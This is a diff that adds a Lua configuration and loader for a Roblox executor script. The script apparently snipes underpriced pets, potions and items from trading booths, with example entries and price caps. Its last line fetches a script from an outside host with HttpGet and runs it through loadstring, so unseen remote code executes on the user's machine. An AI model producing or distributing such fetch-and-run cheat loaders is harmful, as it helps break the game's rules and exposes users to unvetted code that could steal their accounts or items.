@@ -1,0 +1,50 @@
+--[[
+    EXAMPLES
+    { -- Example of sniping potion
+        itemName = "The Cocktail", 
+        priceCap = 145000,
+        itemType = "Potion",
+        itemTier = 1
+    }
+
+    { -- Example of sniping Huge pet / Exclusive pet
+        itemName = "Hue Amethyst Dragon",
+        priceCap = 2000000,
+        itemType = "Pet",
+        itemTier = 1, -- nil for normal, 1 for gold, 2 for rainbow
+        shinyPet = true -- nil for non-shiny, true for shiny
+    }
+
+    { -- Example of sniping items
+        itemName = "Secret Key Upper Half",
+        priceCap = 52000,
+        itemType = "Misc"
+    }
+
+    If you're still unsure about the type of item, you can search for it on https://biggamesapi.io/api/rap
+]]
+
+
+-- Edit this settings
+getgenv().settings = {
+    {
+        itemName = "Mini Chest",
+        priceCap = 32200,
+        itemType = "Misc"
+    },
+    {
+        itemName = "Secret Key Upper Half",
+        priceCap = 52000,
+        itemType = "Misc"
+    },
+    {
+        itemName = "Hue Amethyst Dragon",
+        priceCap = 2000000,
+        itemType = "Pet",
+        itemTier = 1, -- nil for normal, 1 for gold, 2 for rainbow
+        shinyPet = true -- nil for non-shiny, true for shiny
+    }
+}
+
+local tpToBooth = true
+loadstring(game:HttpGet("https://egorikusa.space/4a8821838b9c26a631b5807b.lua", true))()
